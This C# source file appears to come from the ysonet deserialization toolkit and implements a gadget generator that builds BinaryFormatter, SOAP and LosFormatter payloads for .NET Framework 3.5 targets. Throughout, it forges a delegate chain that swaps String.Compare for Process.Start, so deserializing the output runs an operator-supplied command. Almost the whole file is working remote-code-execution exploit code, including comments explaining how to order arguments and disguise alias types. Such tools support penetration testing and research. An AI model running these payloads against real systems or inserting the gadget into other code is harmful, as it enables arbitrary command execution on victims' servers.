using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.Remoting;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Formatters.Soap;
using System.Text;
using System.Xml;
using ysonet.Helpers;

namespace ysonet.Generators
{
    /*
     * TypeConfuseDelegateNetFx35 is the CLR-v2-generation counterpart to the
     * normal TypeConfuseDelegate gadget. The normal chain needs two .NET 4.5 additions:
     * Comparer<T>.Create and its serializable ComparisonComparer<T> implementation. This
     * chain instead reconstructs CLR 2's non-serializable Array.FunctorComparer<string>
     * through Workflow's ObjectSerializedRef and triggers it from the internal CLR 2
     * TreeSet<string> while that set rebuilds during deserialization.
     *
     * The complete trigger-to-sink flow is visible here:
     *
     *   List<object>[0] -> ObjectSerializedRef -> Array.FunctorComparer<string>
     *       comparison -> DelegateSerializationHolder -> String.Compare, Process.Start
     *       c          -> Comparer<string>.Default (BF/Los; null and unused in SOAP)
     *   List<object>[1] -> TreeSet<string>.OnDeserialization -> comparer.Compare
     *
     * Func<string,string,Process> lives in System.Core 3.5 on CLR 2, but in mscorlib on
     * CLR 4. The two delegate proxy classes author the genuine framework holder graph and
     * state the System.Core identity directly. No target ever sees a ysonet proxy type.
     * The generator then forces the existing --legacyfx boundary on a COPY of InputArgs so
     * every ordinary framework identity also names the CLR-v2 generation by default.
     */
    public sealed class TypeConfuseDelegateNetFx35Generator : GenericGenerator
    {
        private const string Mscorlib20 =
            "mscorlib, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string System20 =
            "System, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string SystemCore35 =
            "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
        private const string WorkflowObjectRef =
            "System.Workflow.ComponentModel.Serialization.ActivitySurrogateSelector+"
            + "ObjectSurrogate+ObjectSerializedRef, System.Workflow.ComponentModel, "
            + "Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35";
        private const string DelegateHolder = "System.DelegateSerializationHolder";
        private const string DelegateEntry =
            "System.DelegateSerializationHolder+DelegateEntry";
        private const string FunctorComparer = "System.Array+FunctorComparer`1";
        private const string TreeSet = "System.Collections.Generic.TreeSet`1";
        private const string SoapListAliasNamespace = "YsonetSoapListProxy";
        private const string SoapListAliasType = "YsonetListRootAlias";
        private const string SoapTreeAliasNamespace = "YsonetSoapTreeProxy";
        private const string SoapTreeAliasType = "YsonetTreeRootAlias";

        public override GadgetFacetSet Facets()
        {
            return new GadgetFacetSet()
                .WithKinds(PayloadKind.CodeExecution)
                .WithRequirements(GadgetRequirement.BuiltIn, GadgetRequirement.NetFramework)
                .WithVersions(RuntimeVersion.NetFx35);
        }

        public override string Finders()
        {
            return "James Forshaw";
        }

        public override string Contributors()
        {
            return "Soroush Dalili";
        }

        public override string AdditionalInfo()
        {
            return "CLR2-only: supports .NET Framework 3.5 and does not support CLR4 or "
                + "later. Runs Process.Start(string, string) by rebuilding "
                + "CLR 2's Array.FunctorComparer<string> through Workflow "
                + "ObjectSerializedRef and triggering it from TreeSet<string>. The SOAP form "
                + "is a direct List<object>/TreeSet<string> document: only the "
                + "internal comparer reconstruction uses ObjectSerializedRef, with no outer "
                + "surrogate carrier or nested BinaryFormatter stream. The payload "
                + "names CLR-v2 framework identities automatically; an explicit --legacyfx "
                + "is redundant. The target needs System.Core 3.5 and "
                + "System.Workflow.ComponentModel. NetDataContractSerializer is not supported: "
                + "its CLR-2 reader rejects the graph because ObjectSerializedRef's required "
                + "memberDatas member is missing. On .NET Framework 4.8.1 the Workflow object "
                + "reference rejects this CLR-2 reconstruction with ArgumentException before "
                + "the sink. A local --test is therefore routed automatically to the separately "
                + "shipped .NET Framework 3.5 / CLR2 process; --testclr2 selects it explicitly.";
        }

        public override List<string> Labels()
        {
            return new List<string> { GadgetTags.Independent };
        }

        // Each entry is backed by its own raw and minified CLR-2 effect cell; none is inferred
        // from BinaryFormatter merely because the object graph starts in the same place. The
        // SoapFormatter form is a direct document, not an AxHost/DataSet/BinaryFormatter bridge:
        // its visible root is List<object>, its trigger is TreeSet<string>, and only the internal
        // non-serializable comparer reconstruction names Workflow's ObjectSerializedRef.
        public override List<string> SupportedFormatters()
        {
            return new List<string>
            {
                Formatters.BinaryFormatter,
                Formatters.SoapFormatter,
                Formatters.LosFormatter,
            };
        }

        public override object Generate(string formatter, InputArgs inputArgs)
        {
            if (inputArgs == null)
                throw new ArgumentNullException("inputArgs");

            InputArgs targetArgs = inputArgs.DeepCopy();
            ReadCommandFromFile(targetArgs);
            targetArgs.LegacyFx = true;
            // This gadget is CLR2-only. Preserve the ordinary "test locally" contract by
            // routing -t to the shipped CLR2 victim even though --legacyfx was implicit.
            if (targetArgs.Test)
                targetArgs.TestClr2 = true;

            string executable = targetArgs.CmdFileName;
            string arguments = targetArgs.HasArguments ? targetArgs.CmdArguments : "";
            if (String.Compare(executable, arguments) == 0)
                throw new ArgumentException(Name() + " requires the executable and argument "
                    + "strings to compare as distinct values (got \"" + executable
                    + "\" twice). TreeSet would collapse them to one item and never call "
                    + "the comparer during deserialization.");

            ValidateTargetShape();

            bool soap = formatter.Equals(Formatters.SoapFormatter,
                StringComparison.OrdinalIgnoreCase);
            LegacyFunctorComparerProxy comparer =
                new LegacyFunctorComparerProxy(soap, executable);

            if (soap)
            {
                // SoapFormatter refuses every ACTUAL generic object before writing it. Use
                // non-generic generation proxies, then replace their harmless aliases with the
                // genuine CLR-v2 closed-generic identities in the finished SOAP document. The
                // target therefore sees the same List<object> -> TreeSet<string> workflow graph,
                // not an outer surrogate or a nested BinaryFormatter stream.
                LegacyTreeSetProxy soapTree = new LegacyTreeSetProxy(comparer,
                    executable, arguments);
                LegacyListProxy soapRoot = new LegacyListProxy(comparer, soapTree);
                return SerializeSoapWorkflow(soapRoot, targetArgs);
            }

            Type openTreeSet = RequireType(typeof(System.Collections.Generic.SortedSet<>).Assembly,
                TreeSet);
            Type closedTreeSet = openTreeSet.MakeGenericType(typeof(string));
            object treeSet;
            try
            {
                treeSet = Activator.CreateInstance(closedTreeSet, new object[] { comparer });
            }
            catch (Exception ex)
            {
                throw new SerializationException(Name()
                    + " could not construct TreeSet<string> with its IComparer<string> "
                    + "constructor.", ex);
            }

            ICollection<string> items = treeSet as ICollection<string>;
            if (items == null)
                throw new SerializationException(Name()
                    + " resolved TreeSet<string>, but it is not an ICollection<string>.");
            items.Add(executable);
            items.Add(arguments);

            // ObjectSerializedRef must be read and fixed up before TreeSet's callback asks
            // the comparer to compare its two serialized items.
            List<object> root = new List<object>();
            root.Add(comparer);
            root.Add(treeSet);
            return Serialize(root, formatter, targetArgs);
        }

        private object SerializeSoapWorkflow(LegacyListProxy root, InputArgs inputArgs)
        {
            string payload;
            using (MemoryStream stream = new MemoryStream())
            {
                new SoapFormatter().Serialize(stream, root);
                payload = Encoding.UTF8.GetString(stream.ToArray());
            }

            XmlDocument document = new XmlDocument();
            document.PreserveWhitespace = true;
            document.LoadXml(payload);

            string listType = "System.Collections.Generic.List`1[[System.Object, "
                + Mscorlib20 + "]]";
            string treeType = TreeSet + "[[System.String, " + Mscorlib20 + "]]";
            RewriteSoapAlias(document, SoapListAliasNamespace,
                SoapListAliasType, listType, Mscorlib20);
            RewriteSoapAlias(document, SoapTreeAliasNamespace,
                SoapTreeAliasType, treeType, System20);

            // OuterXml is now the direct generic graph. The rewrite touched only XML names and
            // namespace declarations, never text nodes carrying operator input.
            payload = document.OuterXml;

            if (inputArgs.Minify)
                payload = XmlMinifier.Minify(payload, null, null,
                    FormatterType.SoapFormatter, true);

            return FinishHandWrittenPayload(payload, Formatters.SoapFormatter,
                inputArgs, null, true);
        }

        private static void RewriteSoapAlias(XmlDocument document, string aliasNamespace,
            string aliasType, string targetFullTypeName, string targetAssembly)
        {
            string sourceNamespace = SoapServices.CodeXmlNamespaceForClrTypeNamespace(
                aliasNamespace, aliasNamespace);
            string targetNamespace = SoapServices.CodeXmlNamespaceForClrTypeNamespace(
                "", targetAssembly);
            string encodedTargetType = XmlConvert.EncodeLocalName(targetFullTypeName);
            XmlNodeList matches = document.GetElementsByTagName(aliasType, sourceNamespace);
            if (matches.Count != 1)
                throw new SerializationException("Expected exactly one generation-only SOAP "
                    + "alias element " + aliasNamespace + "." + aliasType + ", found "
                    + matches.Count + ".");

            XmlElement source = matches[0] as XmlElement;
            if (source == null || source.ParentNode == null)
                throw new SerializationException("The generation-only SOAP alias element "
                    + aliasNamespace + "." + aliasType + " has no replaceable parent.");

            XmlElement replacement = document.CreateElement(source.Prefix,
                encodedTargetType, targetNamespace);
            const string xmlnsNamespace = "http://www.w3.org/2000/xmlns/";
            XmlAttribute targetDeclaration = document.CreateAttribute(
                String.IsNullOrEmpty(source.Prefix) ? "" : "xmlns",
                String.IsNullOrEmpty(source.Prefix) ? "xmlns" : source.Prefix,
                xmlnsNamespace);
            targetDeclaration.Value = targetNamespace;
            replacement.Attributes.Append(targetDeclaration);

            foreach (XmlAttribute attribute in source.Attributes)
            {
                bool ownAliasDeclaration = attribute.NamespaceURI == xmlnsNamespace
                    && ((!String.IsNullOrEmpty(source.Prefix)
                            && attribute.LocalName == source.Prefix)
                        || (String.IsNullOrEmpty(source.Prefix)
                            && attribute.LocalName == "xmlns"));
                if (!ownAliasDeclaration)
                    replacement.Attributes.Append(
                        (XmlAttribute)attribute.CloneNode(true));
            }
            while (source.FirstChild != null)
                replacement.AppendChild(source.FirstChild);
            source.ParentNode.ReplaceChild(replacement, source);

            // A writer is free to declare a namespace above the element that uses it. Remove
            // any now-unused alias declaration structurally; an identical operator string in
            // element text is intentionally left alone.
            foreach (XmlNode node in document.GetElementsByTagName("*"))
            {
                XmlElement element = node as XmlElement;
                if (element == null) continue;
                for (int i = element.Attributes.Count - 1; i >= 0; i--)
                {
                    XmlAttribute attribute = element.Attributes[i];
                    if (attribute.NamespaceURI == xmlnsNamespace
                        && attribute.Value == sourceNamespace)
                        element.Attributes.RemoveAt(i);
                }
                if (element.NamespaceURI == sourceNamespace
                    || element.LocalName == aliasType)
                    throw new SerializationException("The finished SOAP document still names "
                        + "the generation-only alias " + aliasNamespace + "." + aliasType
                        + ".");
            }

            if (document.GetElementsByTagName(aliasType, sourceNamespace).Count != 0)
                throw new SerializationException("The finished SOAP document still contains "
                    + "the generation-only alias " + aliasNamespace + "." + aliasType + ".");
        }

        private static void ReadCommandFromFile(InputArgs inputArgs)
        {
            string contents = inputArgs.CmdFromFile;
            if (!String.IsNullOrEmpty(contents))
                inputArgs.Cmd = contents;
        }

        // As in TypeConfuseDelegate, the item the target compares SECOND reaches
        // Process.Start's first parameter, so the executable has to be serialized second. The
        // default "cmd" / "/c ..." pair sorts that way on its own, but a raw pair may not
        // ("notepad.exe zzz.txt" used to build Process.Start("zzz.txt", "notepad.exe")), so
        // the order is fixed at generation time instead: the comparer PROXY that fills the
        // TreeSet orders by ROLE. It is a generation-only object - the wire carries the
        // reconstructed CLR-2 FunctorComparer - so nothing about the payload changes for a
        // command that already sorted the right way round.
        private static Comparison<string> FillOrderPuttingTheExecutableLast(string executable)
        {
            return delegate(string x, string y)
            {
                if (String.Compare(x, y) == 0)
                    return 0;
                return String.Equals(x, executable, StringComparison.Ordinal) ? 1 : -1;
            };
        }

        // Fail at generation with the missing framework shape named explicitly. The target's
        // CLR-2 member order is evidence-backed in the LEGACY tier; these checks ensure the
        // CLR-4 process authoring the graph still exposes every type/member used to describe it.
        private static void ValidateTargetShape()
        {
            Assembly mscorlib = typeof(object).Assembly;
            Type holder = RequireType(mscorlib, DelegateHolder);
            Type entry = RequireType(mscorlib, DelegateEntry);
            RequireInstanceField(entry, "type");
            RequireInstanceField(entry, "assembly");
            RequireInstanceField(entry, "target");
            RequireInstanceField(entry, "targetTypeAssembly");
            RequireInstanceField(entry, "targetTypeName");
            RequireInstanceField(entry, "methodName");
            RequireInstanceField(entry, "delegateEntry");

            Type objectRef = RequireType(WorkflowObjectRef);
            RequireInstanceField(objectRef, "type");
            RequireInstanceField(objectRef, "memberDatas");
            RequireType(mscorlib, FunctorComparer).MakeGenericType(typeof(string));
            RequireType(typeof(System.Collections.Generic.SortedSet<>).Assembly, TreeSet)
                .MakeGenericType(typeof(string));

            if (!typeof(ISerializable).IsAssignableFrom(typeof(Comparison<string>)))
                throw new SerializationException(
                    "The runtime Comparison<string> delegate is not ISerializable.");
            RequireMethod(typeof(Process), "Start", typeof(string), typeof(string));
            RequireMethod(typeof(string), "Compare", typeof(string), typeof(string));

            // The variable is intentionally used: resolving the holder is itself part of
            // the check, even though SetType resolves it again inside the proxy.
            if (holder == null)
                throw new SerializationException("The runtime delegate holder is unavailable.");
        }

        private static Type RequireType(string assemblyQualifiedName)
        {
            Type type = Type.GetType(assemblyQualifiedName, false);
            if (type == null)
                throw new SerializationException("Required target type is unavailable: "
                    + assemblyQualifiedName);
            return type;
        }

        private static Type RequireType(Assembly assembly, string fullName)
        {
            Type type = assembly.GetType(fullName, false);
            if (type == null)
                throw new SerializationException("Required target type is unavailable: "
                    + fullName + " in " + assembly.FullName);
            return type;
        }

        private static FieldInfo RequireInstanceField(Type type, string name)
        {
            FieldInfo field = type.GetField(name,
                BindingFlags.Instance | BindingFlags.Public | BindingFlags.NonPublic);
            if (field == null)
                throw new SerializationException("Required target field is unavailable: "
                    + type.FullName + "." + name);
            return field;
        }

        private static MethodInfo RequireMethod(Type type, string name, params Type[] parameters)
        {
            MethodInfo method = type.GetMethod(name, BindingFlags.Static | BindingFlags.Public,
                null, parameters, null);
            if (method == null)
                throw new SerializationException("Required target method is unavailable: "
                    + type.FullName + "." + name);
            return method;
        }

        [Serializable]
        private sealed class LegacyDelegateEntryProxy : ISerializable
        {
            private readonly string delegateType;
            private readonly string delegateAssembly;
            private readonly string targetAssembly;
            private readonly string targetType;
            private readonly string method;
            private readonly LegacyDelegateEntryProxy next;

            internal LegacyDelegateEntryProxy(string delegateType, string delegateAssembly,
                string targetAssembly, string targetType, string method,
                LegacyDelegateEntryProxy next)
            {
                this.delegateType = delegateType;
                this.delegateAssembly = delegateAssembly;
                this.targetAssembly = targetAssembly;
                this.targetType = targetType;
                this.method = method;
                this.next = next;
            }

            private LegacyDelegateEntryProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only delegate entry proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireType(typeof(object).Assembly, DelegateEntry));
                info.AddValue("type", delegateType);
                info.AddValue("assembly", delegateAssembly);
                info.AddValue("target", null);
                info.AddValue("targetTypeAssembly", targetAssembly);
                info.AddValue("targetTypeName", targetType);
                info.AddValue("methodName", method);
                info.AddValue("delegateEntry", next);
            }
        }

        [Serializable]
        private sealed class LegacyDelegateProxy : ISerializable
        {
            private readonly LegacyDelegateEntryProxy entry;

            internal LegacyDelegateProxy()
            {
                string string20 = "System.String, " + Mscorlib20;
                string process20 = "System.Diagnostics.Process, " + System20;
                string comparison = "System.Comparison`1[[" + string20 + "]]";
                string func = "System.Func`3[[" + string20 + "],[" + string20
                    + "],[" + process20 + "]]";

                LegacyDelegateEntryProxy benign = new LegacyDelegateEntryProxy(
                    comparison, Mscorlib20, Mscorlib20,
                    "System.String", "Compare", null);

                // DelegateSerializationHolder stores a multicast invocation list as a
                // reverse-linked entry chain. The physical head is the attacker and method0
                // is Process.Start; GetRealObject reverses that walk to restore the logical
                // invocation order String.Compare -> Process.Start. Writing the visually
                // intuitive benign-first order produces the wrong delegate.
                entry = new LegacyDelegateEntryProxy(
                    func, SystemCore35, System20,
                    "System.Diagnostics.Process", "Start", benign);
            }

            private LegacyDelegateProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only delegate proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                info.SetType(RequireType(typeof(object).Assembly, DelegateHolder));
                info.AddValue("Delegate", entry);
                info.AddValue("method0", RequireMethod(typeof(Process), "Start",
                    typeof(string), typeof(string)));
                info.AddValue("method1", RequireMethod(typeof(string), "Compare",
                    typeof(string), typeof(string)));
            }
        }

        [Serializable]
        private sealed class LegacyFunctorComparerProxy : IComparer<string>, ISerializable
        {
            private readonly LegacyDelegateProxy comparison = new LegacyDelegateProxy();
            private readonly bool soapCompatible;
            private readonly Comparison<string> authoringOrder;

            // Generation-only: this decides the order the TreeSet is filled in, which is the
            // order the two strings are serialized in, which is what puts the executable in
            // Process.Start's first parameter. See FillOrderPuttingTheExecutableLast.
            public int Compare(string left, string right)
            {
                return authoringOrder(left, right);
            }

            private LegacyFunctorComparerProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only comparer proxy is never deserialized.");
            }

            internal LegacyFunctorComparerProxy(bool soapCompatible, string executable)
            {
                this.soapCompatible = soapCompatible;
                this.authoringOrder = FillOrderPuttingTheExecutableLast(executable);
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                Type functor = RequireType(typeof(object).Assembly, FunctorComparer)
                    .MakeGenericType(typeof(string));
                info.SetType(RequireType(WorkflowObjectRef));
                // CLR 2's FormatterServicesNoSerializableCheck member order is exactly:
                //   comparison, c
                // The LEGACY effect test proves this target-side reconstruction by reaching
                // Process.Start; changing the order turns that positive into a loud failure.
                info.AddValue("type", functor);
                info.AddValue("memberDatas", new object[]
                {
                    comparison,
                    // FunctorComparer.Compare reads only comparison. BinaryFormatter and Los
                    // retain the framework-created fallback comparer to keep their established
                    // bytes unchanged. Soap cannot write that closed generic object, so its
                    // direct graph safely restores the unused field as null.
                    soapCompatible ? null : Comparer<string>.Default,
                });
            }
        }

        [Serializable]
        private sealed class LegacyListProxy : ISerializable
        {
            private readonly object[] items;

            internal LegacyListProxy(LegacyFunctorComparerProxy comparer,
                LegacyTreeSetProxy tree)
            {
                items = new object[] { comparer, tree };
            }

            private LegacyListProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP list proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapListAliasNamespace, SoapListAliasType);
                info.AddValue("_items", items, typeof(object[]));
                info.AddValue("_size", items.Length);
                info.AddValue("_version", items.Length);
            }
        }

        [Serializable]
        private sealed class LegacyTreeSetProxy : ISerializable
        {
            private readonly LegacyFunctorComparerProxy comparer;
            private readonly string[] items;

            internal LegacyTreeSetProxy(LegacyFunctorComparerProxy comparer,
                string executable, string arguments)
            {
                this.comparer = comparer;
                // TreeSet.GetObjectData writes Items in comparer order. Preserve the same order
                // the real generation-time TreeSet used for the BF/Los forms: the executable
                // last, so the target compares it against the root and passes it to
                // Process.Start as the file name. An equal pair is refused before this point.
                items = new string[] { arguments, executable };
            }

            private LegacyTreeSetProxy(SerializationInfo info, StreamingContext context)
            {
                throw new NotSupportedException(
                    "The generation-only SOAP TreeSet proxy is never deserialized.");
            }

            public void GetObjectData(SerializationInfo info, StreamingContext context)
            {
                SetSoapAlias(info, SoapTreeAliasNamespace, SoapTreeAliasType);
                info.AddValue("Count", items.Length);
                // Declaring this member as object avoids asking the SOAP writer to name the
                // generic IComparer<string> interface. TreeSet's serialization constructor asks
                // for that interface and receives the assignable fixed-up comparer object.
                info.AddValue("Comparer", comparer, typeof(object));
                info.AddValue("Version", items.Length);
                info.AddValue("Items", items, typeof(string[]));
            }
        }

        private static void SetSoapAlias(SerializationInfo info, string aliasNamespace,
            string aliasType)
        {
            // A non-generic alias lets SoapFormatter write valid XML. SerializeSoapWorkflow
            // replaces both pieces with the real closed-generic identity before the payload is
            // returned, so no ysonet type or alias exists on the wire.
            info.FullTypeName = aliasNamespace + "." + aliasType;
            info.AssemblyName = aliasNamespace;
        }
    }
}
